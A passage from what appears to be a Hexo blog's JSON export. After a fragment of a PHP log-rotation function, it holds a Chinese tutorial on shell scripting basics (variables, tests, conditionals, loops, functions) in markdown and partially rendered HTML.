DIRECTORY_SEPARATOR . $fileName;</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (is_file($pathLog)) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (filesize($pathLog) &gt;= <span class=\"number\">10000000</span>) &#123;</span><br><span class=\"line\">            $new_file = dirname($pathLog) . <span class=\"string\">'/'</span> . date(<span class=\"string\">'Y_m_d_H_i_s'</span>).<span class=\"string\">'_'</span>  . basename($pathLog);</span><br><span class=\"line\">            copy($pathLog,$new_file);</span><br><span class=\"line\">            file_put_contents($pathLog, <span class=\"string\">'&lt;----'</span> . date(<span class=\"string\">'Y-m-d H:i:s'</span>).<span class=\"string\">'----&gt;'</span> . $data . <span class=\"string\">\"\\n\"</span>);</span><br><span class=\"line\">        &#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            file_put_contents($pathLog, <span class=\"string\">'&lt;----'</span> . date(<span class=\"string\">'Y-m-d H:i:s'</span>).<span class=\"string\">'----&gt;'</span> . $data . <span class=\"string\">\"\\n\"</span>, FILE_APPEND);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        file_put_contents($pathLog, <span class=\"string\">'&lt;----'</span> . date(<span class=\"string\">'Y-m-d H:i:s'</span>).<span class=\"string\">'----&gt;'</span> . $data . <span class=\"string\">\"\\n\"</span>, FILE_APPEND);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>"},{"layout":"post","title":"shell编程基础","abbrlink":16363,"_content":"\n### 前言\n\nShell的概念是源自Unix的命令解释器。Shell不仅可解释用户输入的命令，同时，可解释执行基于命令的脚本语言。使用shell脚本能提高用户操作和管理员进行系统管理的效率。shell脚本擅长处理纯文本类型的数据，而Linux中几乎所有的配置文件、日志都是纯文本类型。\n\n<!--more-->\n\n### 脚本书写规范\n\n```\n1.脚本统一存放目录\n2.选择解释器, 开头要写#! XXX,内核根据#!后的解释器来确定用哪个解释器解释脚本内容\n3.编辑脚本使用vim, 配置~/.vimrc方便个人书写习惯\n4.文件名规范，结尾以sh结束\n```\n\n### shell的基本元素\n\n```\n1.#！/bin/bash 必须的，指出shell的类型\n2.# 注释。在shell中，注释写在#之后，#之后的内容不会执行\n3.变量\n4.控制 循环分支\n```\n\n### shell中的特殊符号\n\n```\n1.#! 注明执行脚本采用的shell\n2.$ 变量符。\n与反斜杠转义符相反，使其后的普通字符作为变量名，如$a表示变量a的值。变量\n字符长度超过1个时，用{}括起来\n3.单引号。\n被引起的字符全部做普通字符，即全部原样echo 'my $SHELL'\n4.双引号\n引号内的内容，除$、转义符\\、倒引号`这三个保留特殊功能，其他字符均做普通字符。\n5.倒引号(数字1键旁边的那个键）\n引号内的字符串当做shell命令行解释执行（同样的功能也可以使用$()来使用），得到的结果\n取代整个倒引号括起来的部分。\n6.反斜线\n反斜线是转义字符，它能把特殊字符变成普通字符。在某个字符前面利用反斜杠（\\）能够阻止\nshell把后面的字符解释为特殊字符。\n7.*  代表0个或者多个特殊字符\n例子 yum.* 代表的可以使yum.也可以是yum.a、yum.ab、yum.abc 当然小数点后面可以有多个字母\n8.? 代表的是任意一个字符\n例子 yum.? 可以是yum.a yum.b yum.c，但是要注意小数点后面必须有任意一个字符\n9.[]\n代表的是中括号中的任意一个\n[abcdef] 可以是a b c d e f 中的任意一个字母当然也可以是数字\n[-]代表的是一个范围\n[a-z] 表示的是字母a到z之间的所有字母\n[^]^是反向选择符号从字面意思可以知道也就是非的意思\n[^abc]表示只要不a b c 这三个字符中的任意一个就选择\n10.$( )\n可以将命令替换输出赋值给变量\n11.{}\n通过括号扩展可以生成需要的字串，括号中可以包含连续的序列或使用逗号分隔的多个项目，连续的序列包括一个起点和一个终点\nuser@computer: ~$ echo {a,b,c}\n a b c\nuser@computer: ~$ echo user{1,5,8}\nuser1 user5 user8\nuser@computer: ~$ echo {0..10}\n0 1 2 3 4 5 6 7 8 9 10\nuser@computer: ~$ mkdir {dir1,dir2,dir3}\nuser@computer: ~$ ls –ld dir{1,2,3}\n```\n\n\n### 变量\n\nshell变量可以保存路径名、文件名或者一个数字等。分为三类：\n\n```\n本地变量: (局部变量)只在创建它们的Shell中使用，可以在shell程序内任意使用和修改它\n们。\n环境变量: 可以在创建它们的Shell及其派生出来的任意子程序中使用。有些变量是用户创建\n的，其他的则是专用的（比如PATH、HOME)。是系统环境的一部分，不必去定义它们，可以在\nshell程序中使用它们 。还能在shell中加以修改。\n内部变量: 由系统提供的。与环境变量不同，用户不能修改它们。\n```\n\n\n#### 本地变量\n\n```\n本地变量 在用户现在的shell生命期的脚本中使用\n 变量名=值\n1.等号两边不可以有空格\n2.取值包含空格，必须用双引号括起来\n3.Shell变量可以用大小写字母，区分大小写\n\n变量是弱类型的, 不用声明类型\n\n# 变量声明及赋值格式\n变量=值（等号两边不能有空格）\n\n# 变量的引用\n $变量名\n ${变量名}\n 变量名为1个字符时建议使用方式一，多余一个字符时建议使用方式二\n 举例: $a ${abc}\n\n# 清除变量\nunset 变量名\nuser@computer: ~$ name=Jack\nuser@computer: ~$ echo ${name}\nuser@computer: ~$ unset name  # 注意,name前没有$\n\n# 设置只读变量\n设置变量时，不想再改变其值，可以将之设为只读变量\n 变量名=值\n readonly  变量名\n```\n\n#### 环境变量\n\nBash预设了很多环境变量，实际使用中，可以直接调用这些变量。环境变量可以用于所有子程序，着包括编辑器、脚本和应用\n\n内置环境变量\n\n```\nHOME: 代表使用者的家目录。cd ~ 去到使用者的家目录 或者利用 cd 就可以直接回到使用者\n家目录了。\nSHELL: 目前这个环境使用的 SHELL 是哪个程序？ 如果是 bash 的话，预设是 /bin/bash\nPWD：用户当前工作目录的路径。它指出用户目前在Linux文件系统中处在什么位置。它是由\nLinux自动设置的\nHISTSIZE: 这个与“历史命令”有关，曾经下达过的指令可以被系统记录下来，而记录的“数目”\n则是由这个值来设定的。\nPATH: 就是执行文件搜寻的路径，目录与目录中间以冒号(:)分隔， 由于文件的搜寻是依序由\nPATH的变量内的目录来查询，所以，目录的顺序也很重要。\n```\n\n\n```\n环境变量可以在命令行中设置，但用户注销时这些值将丢失\n   环境变量均为大写\n   必须用export命令导出\n\n# 设置环境变量\nvariable-name=value\nexport variable-name(环境变量名大写)\n\n# 显示环境变量\nenv 可以看到所有的环境变量\necho $环境变量名 （显示一个变量）\n\n# 清除环境变量\nunset 环境变量名\n```\n\n\n修改path环境变量\n\n```\n修改PATH环境变量，使脚本不用加路径，直接输入文件名字即可执行。\n# 命令行修改环境变量\n以下在用户user主目录下操作：\nmkdir shdir && cd shdir\nvi hello\nchmod 755 hello\ncd ～\nexport PATH=$PATH:$HOME/shdir\n在任何目录下，输入hello即可执行该文件。\n本方式下环境变量如果修改错了，exit退出后重新登陆即可恢复系统默认的值。\n```\n\n配置文件中修改环境变量\n\n```\n注意，修改环境变量前最好先备份一下旧的：\nexport tem=$PATH\necho $tem >>pathbake\n\n需要知道环境变量与哪些配置文件有关：不同发行版会有不同，但命名还是有通性的：\nfind / -name “*profile”\nfind / -name “*bashrc”\n全局配置文件/etc/profile\n本地配置文件~/.bashrc\n```\n\n\n#### 内部变量\n\n内部变量是Linux所提供的一种特殊类型的变量，这类变量在程序中用来作出判断。在shell程序内这类变量的值是不能修改的。\n\n```\n部分内部变量是：\n$# 传送给shell程序的位置参数的数量\n$? 最后命令的完成码或者在shell程序内部执行的shell程序（返回值）\n$0 shell程序的名称\n$* 调用shell程序时所传送的全部参数的单字符串，\"参数1\", \"参数2\"…形式保存的参数\n$@ \"参数1\", \"参数2\"…形式保存的参数\n$n 第n个参数\n$$ 本程序的PID\n$! 上一个命令的PID\n```\n\n\n### 输入与输出\n\n```\n# read 从键盘上读取变量的值\nread  [选项]  变量名列表\n    常用选项\n    -a ANAME   将输入读入ANAME的数组\n    -n NCHARS  读入N个字符\n    -p PROMPT  显示一个提示\n    -r         取消转移\n    -s         安静模式，输入的字符将不会提示\n    -t TIMEOUT 超过指定时间，read自动停止\n\n# echo 显示字符串或变量的值\necho  [选项]  字符串\n    常用选项\n    -n  不在最后自动换行\n    -e  启用反斜线控制字符的转换\n    -E  不处理转义字符。此为缺省选项；\n```\n\n\n```sh\n#! /bin/bash\n# 输入一句话，打印输入的话\nread -p 'please type some words, I will print them: ' words\necho $words\n```\n\n### 条件测试\n\n```\n# test\ntest 条件表达式\n如果测试条件为真，test命令会返回0，否则返回一个非0的数值\ntest 语句与if/then和case语句一起，构成shell编程的控制转移结构\n\n# []\n[ 条件表达式 ]\n方括号的内侧两边各需一个空格\n\n条件表达式的值为真返回零，为假时返回非零值\n\n```\n\n\n#### 文件状态判断\n\n```\n-d filename\t若文件filename为目录文件，则返回真\n\n-f filename\t文件是否存在且为普通文件，则返回真\n\n-r filename\t若文件filename可读，则返回真\n\n-s filename\t若文件filename的长度大于0，则返回真\n\n-w filename\t若文件filename可写，则返回真\n\n-x filename\t若文件filename可执行，则返回真\n\n-e filename\t文件是否存在\n\n```\n\n\n```\n#! /bin/bash\n# 输入文件的绝对路径，判断文件是否存在\nread  -p 'input file path: ' file\nif [ -e $file ]\n    then\n    echo '文件存在'\nelse\n    echo '文件不存在'\nfi\n```\n\n\n#### 条件语句\n\n```\nif  [ 条件表达式 ]\n    then\n    命令序列1\nelse\n    命令序列2\nfi\n当\"条件表达式\"的测试值为真时，执行\"命令序列1\"，否则，执行\"命令序列2\"。命令序列中的命令\n可以是一个或者多个。\n\n\nif [ 条件表达式 ]; then\n    命令序列\nfi\n当\"条件表达式\"的测试值为真时，执行\"命令序列\",否则，执行条件语句后面的命令。条件表达\n式与then之间的分号\";\"起命令分隔符的作用。\n\n语法形式三\n\nif test 条件表达式1\n    then\n    命令序列1\nelif [ 条件表达式2 ]\n    then\n    命令序列2\nelse\n    命令序列3\nfi\n这是包含二层嵌套的条件语句，当\"条件表达式1\"为真时，执行\"命令序列1\",否则，在\"条件表\n达式2\"为真的情况下，执行\"命令序列2\"，否则，执行\"命令序列3\",\"命令序列3\"属于第2个条\n件语句的一部分。\n```\n\n```sh\n#! /bin/bash\n# 判断输入的路径是文件还是目录\nread -p 'please input the file path: ' file\nif [ -d $file ]\n    then\n    echo 'this is a directory'\nelif [ -f $file ]\n    then\n    echo 'this is a file'\nelse\n    echo 'wrong file type, or the file do not exist'\nfi\n```\n\n#### 数字操作符\n\n```\nn1 –eq n2判断数字n1与n2是否相等，若相等，返回0，否则，返回1\n\nn1 –ne n2判断数字n1与n2是否不等，若不等，返回0，否则，返回1\n\nn1 –lt n2判断数字n1是否小于n2，若是，返回0，否则，返回1\n\nn1 –gt n2判断数字n1是否大于n2，若是，返回0，否则，返回1\n\nn1 –le n2判断数字n1是否小于或等于n2，若是，返回0，否则，返回1\n\nn1 –ge n2 判断数字n1是否大于或等于n2，若是，返回0，否则，返回1\n\n```\n\n#### 字符串操作符\n\n```\nstring 若字符串string非空，则返回真\n\n\n-n string 若字符串string长度大于0，则返回真\n\n\n-z string 若字符串string长度为0，则为返回真\n\n\nstring1 = string2 若字符串string1和string2相等，则返回真\n\n\nstring1 != string2 若字符串string1和 string2不等，则返回真\n\n```\n\n#### 逻辑操作符\n\n```\ne1 –a e2\t逻辑表达式e1和e2同时为真时，返回0，否则，返回1\ne1 –o e2\t逻辑表达式e1和e2有一个为真时，返回0，否则，返回1\n! e1\t    若逻辑表达式e1不为真时，返回0，,否则，返回1\n```\n\n### 循环语句\n\n```\nfor 变量名 in 参数列表\n    do\n    命令列表\ndone\n将\"参数列表\"中的元素依次赋给\"变量名\"，在每次赋值后执行\"命令列表\"，\"参数列表\"表示\"变\n量名\"的取值范围\n\nfor ((初始化变量值；结束循环条件；运算))\n    do\n    命令序列\ndone\n\nwhile [ 条件表达式 ]\n    do\n    命令列表\ndone\n循环执行\"命令列表\"中的命令，直至\"条件表达式\"的值为假。\n\nUntil [ 条件 ]\n    do\n    命令序列\nDone\n直到条件满足时循环结束\n\n```\n\n\n```sh\n#! /bin/bash\n# 将指定目录下(参数传递$1)的所有以.txt为后缀的文件更名为*.doc\ndirectory=$1\nif [ ! $directory ]\n  then\n  echo \"please input the argument directory\"\n  exit\nfi\nfiles=`ls ${directory}`\nfor file in $files;\n  do\n  if [ -f ${file} ]\n    echo $file\n    then\n    suffix=${file#*\\.}\n    echo $suffix\n    if [[ $suffix == \"txt\" ]]\n      then\n      prefix=${file%\\.*}\n      mv $directory/$file $directory/$prefix.doc\n    fi\n  fi\ndone\n```\n\n### 函数\n\n```bash\nfunctionname() {\n    命令列表\n    return\n}\n函数的调用方式为：\nfunctionname arguments\n```\n\n\n","source":"_posts/2019/6/Shll编程基础.md","raw":"---\nlayout: post\ntitle: shell编程基础\ntags:\n  - shell\ncategories:\n  - linux\nabbrlink: 16363\n---\n\n### 前言\n\nShell的概念是源自Unix的命令解释器。Shell不仅可解释用户输入的命令，同时，可解释执行基于命令的脚本语言。使用shell脚本能提高用户操作和管理员进行系统管理的效率。shell脚本擅长处理纯文本类型的数据，而Linux中几乎所有的配置文件、日志都是纯文本类型。\n\n<!--more-->\n\n### 脚本书写规范\n\n```\n1.脚本统一存放目录\n2.选择解释器, 开头要写#! XXX,内核根据#!后的解释器来确定用哪个解释器解释脚本内容\n3.编辑脚本使用vim, 配置~/.vimrc方便个人书写习惯\n4.文件名规范，结尾以sh结束\n```\n\n### shell的基本元素\n\n```\n1.#！/bin/bash 必须的，指出shell的类型\n2.# 注释。在shell中，注释写在#之后，#之后的内容不会执行\n3.变量\n4.控制 循环分支\n```\n\n### shell中的特殊符号\n\n```\n1.#! 注明执行脚本采用的shell\n2.$ 变量符。\n与反斜杠转义符相反，使其后的普通字符作为变量名，如$a表示变量a的值。变量\n字符长度超过1个时，用{}括起来\n3.单引号。\n被引起的字符全部做普通字符，即全部原样echo 'my $SHELL'\n4.双引号\n引号内的内容，除$、转义符\\、倒引号`这三个保留特殊功能，其他字符均做普通字符。\n5.倒引号(数字1键旁边的那个键）\n引号内的字符串当做shell命令行解释执行（同样的功能也可以使用$()来使用），得到的结果\n取代整个倒引号括起来的部分。\n6.反斜线\n反斜线是转义字符，它能把特殊字符变成普通字符。在某个字符前面利用反斜杠（\\）能够阻止\nshell把后面的字符解释为特殊字符。\n7.*  代表0个或者多个特殊字符\n例子 yum.* 代表的可以使yum.也可以是yum.a、yum.ab、yum.abc 当然小数点后面可以有多个字母\n8.? 代表的是任意一个字符\n例子 yum.? 可以是yum.a yum.b yum.c，但是要注意小数点后面必须有任意一个字符\n9.[]\n代表的是中括号中的任意一个\n[abcdef] 可以是a b c d e f 中的任意一个字母当然也可以是数字\n[-]代表的是一个范围\n[a-z] 表示的是字母a到z之间的所有字母\n[^]^是反向选择符号从字面意思可以知道也就是非的意思\n[^abc]表示只要不a b c 这三个字符中的任意一个就选择\n10.$( )\n可以将命令替换输出赋值给变量\n11.{}\n通过括号扩展可以生成需要的字串，括号中可以包含连续的序列或使用逗号分隔的多个项目，连续的序列包括一个起点和一个终点\nuser@computer: ~$ echo {a,b,c}\n a b c\nuser@computer: ~$ echo user{1,5,8}\nuser1 user5 user8\nuser@computer: ~$ echo {0..10}\n0 1 2 3 4 5 6 7 8 9 10\nuser@computer: ~$ mkdir {dir1,dir2,dir3}\nuser@computer: ~$ ls –ld dir{1,2,3}\n```\n\n\n### 变量\n\nshell变量可以保存路径名、文件名或者一个数字等。分为三类：\n\n```\n本地变量: (局部变量)只在创建它们的Shell中使用，可以在shell程序内任意使用和修改它\n们。\n环境变量: 可以在创建它们的Shell及其派生出来的任意子程序中使用。有些变量是用户创建\n的，其他的则是专用的（比如PATH、HOME)。是系统环境的一部分，不必去定义它们，可以在\nshell程序中使用它们 。还能在shell中加以修改。\n内部变量: 由系统提供的。与环境变量不同，用户不能修改它们。\n```\n\n\n#### 本地变量\n\n```\n本地变量 在用户现在的shell生命期的脚本中使用\n 变量名=值\n1.等号两边不可以有空格\n2.取值包含空格，必须用双引号括起来\n3.Shell变量可以用大小写字母，区分大小写\n\n变量是弱类型的, 不用声明类型\n\n# 变量声明及赋值格式\n变量=值（等号两边不能有空格）\n\n# 变量的引用\n $变量名\n ${变量名}\n 变量名为1个字符时建议使用方式一，多余一个字符时建议使用方式二\n 举例: $a ${abc}\n\n# 清除变量\nunset 变量名\nuser@computer: ~$ name=Jack\nuser@computer: ~$ echo ${name}\nuser@computer: ~$ unset name  # 注意,name前没有$\n\n# 设置只读变量\n设置变量时，不想再改变其值，可以将之设为只读变量\n 变量名=值\n readonly  变量名\n```\n\n#### 环境变量\n\nBash预设了很多环境变量，实际使用中，可以直接调用这些变量。环境变量可以用于所有子程序，着包括编辑器、脚本和应用\n\n内置环境变量\n\n```\nHOME: 代表使用者的家目录。cd ~ 去到使用者的家目录 或者利用 cd 就可以直接回到使用者\n家目录了。\nSHELL: 目前这个环境使用的 SHELL 是哪个程序？ 如果是 bash 的话，预设是 /bin/bash\nPWD：用户当前工作目录的路径。它指出用户目前在Linux文件系统中处在什么位置。它是由\nLinux自动设置的\nHISTSIZE: 这个与“历史命令”有关，曾经下达过的指令可以被系统记录下来，而记录的“数目”\n则是由这个值来设定的。\nPATH: 就是执行文件搜寻的路径，目录与目录中间以冒号(:)分隔， 由于文件的搜寻是依序由\nPATH的变量内的目录来查询，所以，目录的顺序也很重要。\n```\n\n\n```\n环境变量可以在命令行中设置，但用户注销时这些值将丢失\n   环境变量均为大写\n   必须用export命令导出\n\n# 设置环境变量\nvariable-name=value\nexport variable-name(环境变量名大写)\n\n# 显示环境变量\nenv 可以看到所有的环境变量\necho $环境变量名 （显示一个变量）\n\n# 清除环境变量\nunset 环境变量名\n```\n\n\n修改path环境变量\n\n```\n修改PATH环境变量，使脚本不用加路径，直接输入文件名字即可执行。\n# 命令行修改环境变量\n以下在用户user主目录下操作：\nmkdir shdir && cd shdir\nvi hello\nchmod 755 hello\ncd ～\nexport PATH=$PATH:$HOME/shdir\n在任何目录下，输入hello即可执行该文件。\n本方式下环境变量如果修改错了，exit退出后重新登陆即可恢复系统默认的值。\n```\n\n配置文件中修改环境变量\n\n```\n注意，修改环境变量前最好先备份一下旧的：\nexport tem=$PATH\necho $tem >>pathbake\n\n需要知道环境变量与哪些配置文件有关：不同发行版会有不同，但命名还是有通性的：\nfind / -name “*profile”\nfind / -name “*bashrc”\n全局配置文件/etc/profile\n本地配置文件~/.bashrc\n```\n\n\n#### 内部变量\n\n内部变量是Linux所提供的一种特殊类型的变量，这类变量在程序中用来作出判断。在shell程序内这类变量的值是不能修改的。\n\n```\n部分内部变量是：\n$# 传送给shell程序的位置参数的数量\n$? 最后命令的完成码或者在shell程序内部执行的shell程序（返回值）\n$0 shell程序的名称\n$* 调用shell程序时所传送的全部参数的单字符串，\"参数1\", \"参数2\"…形式保存的参数\n$@ \"参数1\", \"参数2\"…形式保存的参数\n$n 第n个参数\n$$ 本程序的PID\n$! 上一个命令的PID\n```\n\n\n### 输入与输出\n\n```\n# read 从键盘上读取变量的值\nread  [选项]  变量名列表\n    常用选项\n    -a ANAME   将输入读入ANAME的数组\n    -n NCHARS  读入N个字符\n    -p PROMPT  显示一个提示\n    -r         取消转移\n    -s         安静模式，输入的字符将不会提示\n    -t TIMEOUT 超过指定时间，read自动停止\n\n# echo 显示字符串或变量的值\necho  [选项]  字符串\n    常用选项\n    -n  不在最后自动换行\n    -e  启用反斜线控制字符的转换\n    -E  不处理转义字符。此为缺省选项；\n```\n\n\n```sh\n#! /bin/bash\n# 输入一句话，打印输入的话\nread -p 'please type some words, I will print them: ' words\necho $words\n```\n\n### 条件测试\n\n```\n# test\ntest 条件表达式\n如果测试条件为真，test命令会返回0，否则返回一个非0的数值\ntest 语句与if/then和case语句一起，构成shell编程的控制转移结构\n\n# []\n[ 条件表达式 ]\n方括号的内侧两边各需一个空格\n\n条件表达式的值为真返回零，为假时返回非零值\n\n```\n\n\n#### 文件状态判断\n\n```\n-d filename\t若文件filename为目录文件，则返回真\n\n-f filename\t文件是否存在且为普通文件，则返回真\n\n-r filename\t若文件filename可读，则返回真\n\n-s filename\t若文件filename的长度大于0，则返回真\n\n-w filename\t若文件filename可写，则返回真\n\n-x filename\t若文件filename可执行，则返回真\n\n-e filename\t文件是否存在\n\n```\n\n\n```\n#! /bin/bash\n# 输入文件的绝对路径，判断文件是否存在\nread  -p 'input file path: ' file\nif [ -e $file ]\n    then\n    echo '文件存在'\nelse\n    echo '文件不存在'\nfi\n```\n\n\n#### 条件语句\n\n```\nif  [ 条件表达式 ]\n    then\n    命令序列1\nelse\n    命令序列2\nfi\n当\"条件表达式\"的测试值为真时，执行\"命令序列1\"，否则，执行\"命令序列2\"。命令序列中的命令\n可以是一个或者多个。\n\n\nif [ 条件表达式 ]; then\n    命令序列\nfi\n当\"条件表达式\"的测试值为真时，执行\"命令序列\",否则，执行条件语句后面的命令。条件表达\n式与then之间的分号\";\"起命令分隔符的作用。\n\n语法形式三\n\nif test 条件表达式1\n    then\n    命令序列1\nelif [ 条件表达式2 ]\n    then\n    命令序列2\nelse\n    命令序列3\nfi\n这是包含二层嵌套的条件语句，当\"条件表达式1\"为真时，执行\"命令序列1\",否则，在\"条件表\n达式2\"为真的情况下，执行\"命令序列2\"，否则，执行\"命令序列3\",\"命令序列3\"属于第2个条\n件语句的一部分。\n```\n\n```sh\n#! /bin/bash\n# 判断输入的路径是文件还是目录\nread -p 'please input the file path: ' file\nif [ -d $file ]\n    then\n    echo 'this is a directory'\nelif [ -f $file ]\n    then\n    echo 'this is a file'\nelse\n    echo 'wrong file type, or the file do not exist'\nfi\n```\n\n#### 数字操作符\n\n```\nn1 –eq n2判断数字n1与n2是否相等，若相等，返回0，否则，返回1\n\nn1 –ne n2判断数字n1与n2是否不等，若不等，返回0，否则，返回1\n\nn1 –lt n2判断数字n1是否小于n2，若是，返回0，否则，返回1\n\nn1 –gt n2判断数字n1是否大于n2，若是，返回0，否则，返回1\n\nn1 –le n2判断数字n1是否小于或等于n2，若是，返回0，否则，返回1\n\nn1 –ge n2 判断数字n1是否大于或等于n2，若是，返回0，否则，返回1\n\n```\n\n#### 字符串操作符\n\n```\nstring 若字符串string非空，则返回真\n\n\n-n string 若字符串string长度大于0，则返回真\n\n\n-z string 若字符串string长度为0，则为返回真\n\n\nstring1 = string2 若字符串string1和string2相等，则返回真\n\n\nstring1 != string2 若字符串string1和 string2不等，则返回真\n\n```\n\n#### 逻辑操作符\n\n```\ne1 –a e2\t逻辑表达式e1和e2同时为真时，返回0，否则，返回1\ne1 –o e2\t逻辑表达式e1和e2有一个为真时，返回0，否则，返回1\n! e1\t    若逻辑表达式e1不为真时，返回0，,否则，返回1\n```\n\n### 循环语句\n\n```\nfor 变量名 in 参数列表\n    do\n    命令列表\ndone\n将\"参数列表\"中的元素依次赋给\"变量名\"，在每次赋值后执行\"命令列表\"，\"参数列表\"表示\"变\n量名\"的取值范围\n\nfor ((初始化变量值；结束循环条件；运算))\n    do\n    命令序列\ndone\n\nwhile [ 条件表达式 ]\n    do\n    命令列表\ndone\n循环执行\"命令列表\"中的命令，直至\"条件表达式\"的值为假。\n\nUntil [ 条件 ]\n    do\n    命令序列\nDone\n直到条件满足时循环结束\n\n```\n\n\n```sh\n#! /bin/bash\n# 将指定目录下(参数传递$1)的所有以.txt为后缀的文件更名为*.doc\ndirectory=$1\nif [ ! $directory ]\n  then\n  echo \"please input the argument directory\"\n  exit\nfi\nfiles=`ls ${directory}`\nfor file in $files;\n  do\n  if [ -f ${file} ]\n    echo $file\n    then\n    suffix=${file#*\\.}\n    echo $suffix\n    if [[ $suffix == \"txt\" ]]\n      then\n      prefix=${file%\\.*}\n      mv $directory/$file $directory/$prefix.doc\n    fi\n  fi\ndone\n```\n\n### 函数\n\n```bash\nfunctionname() {\n    命令列表\n    return\n}\n函数的调用方式为：\nfunctionname arguments\n```\n\n\n","slug":"2019/6/Shll编程基础","published":1,"date":"2019-06-26T05:54:48.731Z","updated":"2020-04-12T06:34:43.625Z","comments":1,"photos":[],"link":"","_id":"ck9z76vzu001j44vqf9cpgeb3","content":"<h3 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h3><p>Shell的概念是源自Unix的命令解释器。Shell不仅可解释用户输入的命令，同时，可解释执行基于命令的脚本语言。使用shell脚本能提高用户操作和管理员进行系统管理的效率。shell脚本擅长处理纯文本类型的数据，而Linux中几乎所有的配置文件、日志都是纯文本类型。</p>\n<a id=\"more\"></a>\n<h3 id=\"脚本书写规范\"><a href=\"#脚本书写规范\" class=\"headerlink\" title=\"脚本书写规范\"></a>脚本书写规范</h3><figure class=\"highlight lsl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>脚本统一存放目录</span><br><span class=\"line\"><span class=\"number\">2.</span>选择解释器, 开头要写#! XXX,内核根据#!后的解释器来确定用哪个解释器解释脚本内容</span><br><span class=\"line\"><span class=\"number\">3.</span>编辑脚本使用vim, 配置~/.vimrc方便个人书写习惯</span><br><span class=\"line\"><span class=\"number\">4.</span>文件名规范，结尾以sh结束</span><br></pre></td></tr></table></figure>\n<h3 id=\"shell的基本元素\"><a href=\"#shell的基本元素\" class=\"headerlink\" title=\"shell的基本元素\"></a>shell的基本元素</h3><figure class=\"highlight clean\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>#！/bin/bash 必须的，指出shell的类型</span><br><span class=\"line\"><span class=\"number\">2.</span># 注释。在shell中，注释写在#之后，#之后的内容不会执行</span><br><span class=\"line\"><span class=\"number\">3.</span>变量</span><br><span class=\"line\"><span class=\"number\">4.</span>控制 循环分支</span><br></pre></td></tr></table></figure>\n<h3 id=\"shell中的特殊符号\"><a href=\"#shell中的特殊符号\" class=\"headerlink\" title=\"shell中的特殊符号\"></a>shell中的特殊符号</h3><figure class=\"highlight elixir\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1</span>.<span class=\"comment\">#! 注明执行脚本采用的shell</span></span><br><span class=\"line\"><span class=\"number\">2</span>.<span class=\"variable\">$ </span>变量符。</span><br><span class=\"line\">与反斜杠转义符相反，使其后的普通字符作为变量名，如<span class=\"variable\">$a</span>表示变量a的值。变量</span><br><span class=\"line\">字符长度超过<span class=\"number\">1</span>个时，用&#123;&#125;括起来</span><br><span class=\"line\"><span class=\"number\">3</span>.单引号。</span><br><span class=\"line\">被引起的字符全部做普通字符，即全部原样echo <span class=\"string\">'my $SHELL'</span></span><br><span class=\"line\"><span class=\"number\">4</span>.双引号</span><br><span class=\"line\">引号内的内容，除<span class=\"variable\">$、</span>转义符\\、倒引号`这三个保留特殊功能，其他字符均做普通字符。</span><br><span class=\"line\"><span class=\"number\">5</span>.倒引号(数字<span class=\"number\">1</span>键旁边的那个键）</span><br><span class=\"line\">引号内的字符串当做shell命令行解释执行（同样的功能也可以使用<span class=\"variable\">$(</span>)来使用），得到的结果</span><br><span class=\"line\">取代整个倒引号括起来的部分。</span><br><span class=\"line\"><span class=\"number\">6</span>.反斜线</span><br><span class=\"line\">反斜线是转义字符，它能把特殊字符变成普通字符。在某个字符前面利用反斜杠（\\）能够阻止</span><br><span class=\"line\">shell把后面的字符解释为特殊字符。</span><br><span class=\"line\"><span class=\"number\">7</span>.*  代表<span class=\"number\">0</span>个或者多个特殊字符</span><br><span class=\"line\">例子 yum.* 代表的可以使yum.也可以是yum.a、yum.ab、yum.abc 当然小数点后面可以有多个字母</span><br><span class=\"line\"><span class=\"number\">8</span>.? 代表的是任意一个字符</span><br><span class=\"line\">例子 yum.? 可以是yum.a yum.b yum.c，但是要注意小数点后面必须有任意一个字符</span><br><span class=\"line\"><span class=\"number\">9</span>.[]</span><br><span class=\"line\">代表的是中括号中的任意一个</span><br><span class=\"line\">[abcdef] 可以是a b c d e f 中的任意一个字母当然也可以是数字</span><br><span class=\"line\">[-]代表的是一个范围</span><br><span class=\"line\">[a-z] 表示的是字母a到z之间的所有字母</span><br><span class=\"line\">[^]^是反向选择符号从字面意思可以知道也就是非的意思</span><br><span class=\"line\">[^abc]表示只要不a b c 这三个字符中的任意一个就选择</span><br><span class=\"line\"><span class=\"number\">10</span>.<span class=\"variable\">$(</span> )</span><br><span class=\"line\">可以将命令替换输出赋值给变量</span><br><span class=\"line\"><span class=\"number\">11</span>.&#123;&#125;</span><br><span 